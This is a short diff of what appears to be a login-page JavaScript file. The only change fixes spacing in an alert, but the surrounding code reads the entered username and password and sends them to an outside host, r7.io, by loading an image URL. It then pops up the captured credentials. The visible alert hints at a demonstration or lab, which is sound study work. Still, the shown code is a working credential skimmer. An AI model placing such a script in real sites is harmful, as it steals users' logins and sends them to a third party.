@@ -5,7 +5,7 @@ document.addEventListener("DOMContentLoaded", function() {
 		var un = document.getElementById("login_username").value;
 		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(un) + encodeURIComponent(pw);
 		console.log(img);
-		alert("Username is: " + un + "and Password is: " + pw);
+		alert("Username is: " + un + " and Password is: " + pw);
 	};
 });
 
